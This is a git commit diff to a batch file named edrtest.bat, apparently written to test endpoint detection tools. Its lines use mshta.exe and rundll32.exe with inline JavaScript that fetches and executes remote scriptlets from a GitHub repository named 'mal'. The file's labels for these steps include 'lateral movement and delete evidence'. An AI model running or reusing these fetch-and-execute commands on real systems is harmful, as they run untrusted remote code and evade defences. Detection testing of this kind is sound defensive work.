11c167b1dcd629264a43f0f87d84f1a7c9cd4201
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-03-18 16:32:22 +0900

    Update edrtest.bat

--- edrtest.bat
+++ edrtest.bat
@@ -1,5 +1,5 @@
 echo EDR test powershell activity
-mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3.sct")).Exec();close()
+mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2.sct")).Exec();close()
 timeout 5
 echo EDR test lateral movement and delete evidence
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2")
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3")
